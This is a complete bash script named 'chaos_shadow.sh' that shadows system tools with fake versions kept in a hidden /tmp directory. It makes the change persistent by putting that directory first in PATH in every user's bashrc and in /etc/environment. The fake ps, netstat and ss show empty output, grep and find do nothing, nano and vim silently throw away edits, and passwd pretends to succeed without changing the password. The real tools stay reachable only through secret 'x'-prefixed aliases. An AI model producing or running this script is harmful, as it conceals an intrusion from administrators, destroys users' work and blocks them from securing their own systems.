#!/bin/bash
# chaos_shadow.sh

SHADOW_DIR="/tmp/.cache/lib"
mkdir -p "$SHADOW_DIR"

# --- sudo ---
cat > "$SHADOW_DIR/sudo" << 'EOF'
#!/bin/bash
echo "nice try :)"
exit 1
EOF

# --- ps ---
cat > "$SHADOW_DIR/ps" << 'EOF'
#!/bin/bash
echo "PID TTY          TIME CMD"
exit 0
EOF

# --- netstat ---
cat > "$SHADOW_DIR/netstat" << 'EOF'
#!/bin/bash
echo "Active Internet connections (w/o servers)"
echo "Proto Recv-Q Send-Q Local Address           Foreign Address         State"
exit 0
EOF

# --- ss ---
cat > "$SHADOW_DIR/ss" << 'EOF'
#!/bin/bash
echo "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port"
exit 0
EOF

# --- grep ---
cat > "$SHADOW_DIR/grep" << 'EOF'
#!/bin/bash
exit 1
EOF

# --- find ---
cat > "$SHADOW_DIR/find" << 'EOF'
#!/bin/bash
exit 0
EOF

# --- nano ---
cat > "$SHADOW_DIR/nano" << 'EOF'
#!/bin/bash
# open nano normally but intercept the write
TMPFILE=$(mktemp)
/usr/bin/nano "$@" "$TMPFILE"
rm -f "$TMPFILE"
exit 0
EOF

# --- vim ---
cat > "$SHADOW_DIR/vim" << 'EOF'
#!/bin/bash
TMPFILE=$(mktemp)
/usr/bin/vim "$@" "$TMPFILE"
rm -f "$TMPFILE"
exit 0
EOF

# --- history ---
cat > "$SHADOW_DIR/history" << 'EOF'
#!/bin/bash
exit 0
EOF

# --- whoami ---
cat > "$SHADOW_DIR/whoami" << 'EOF'
#!/bin/bash
echo "definitely_not_hacked"
EOF

# --- hostname ---
cat > "$SHADOW_DIR/hostname" << 'EOF'
#!/bin/bash
echo "this-is-fine.local"
EOF

# --- passwd ---
cat > "$SHADOW_DIR/passwd" << 'EOF'
#!/bin/bash
echo "Enter new password: "
read -s _
echo "Retype new password: "
read -s _
echo "passwd: password updated successfully"
exit 0
EOF

# --- systemctl ---
cat > "$SHADOW_DIR/systemctl" << 'EOF'
#!/bin/bash
echo "Unit $2.service not found."
exit 1
EOF

chmod +x "$SHADOW_DIR"/*

# drop real aliases with x prefix into global bashrc
ALIASES='
alias xudo="/usr/bin/sudo"
alias xs="/usr/bin/ps"
alias xetstat="/usr/bin/netstat"
alias xs="/usr/bin/ss"
alias xrep="/usr/bin/grep"
alias xind="/usr/bin/find"
alias xano="/usr/bin/nano"
alias xim="/usr/bin/vim"
alias xistory="/usr/bin/history"
alias xhoami="/usr/bin/whoami"
alias xostname="/usr/bin/hostname"
alias xasswd="/usr/bin/passwd"
alias xystemctl="/usr/bin/systemctl"
'

echo "$ALIASES" >> /etc/bash.bashrc
echo "$ALIASES" >> /root/.bashrc
for user_home in /home/*; do
    [ -f "$user_home/.bashrc" ] && echo "$ALIASES" >> "$user_home/.bashrc"
done

# poison PATH
echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> /etc/bash.bashrc
echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> /root/.bashrc
for user_home in /home/*; do
    [ -f "$user_home/.bashrc" ] && echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> "$user_home/.bashrc"
done

# also hit /etc/environment for non-interactive shells
sed -i "s|PATH=\"|PATH=\"$SHADOW_DIR:|" /etc/environment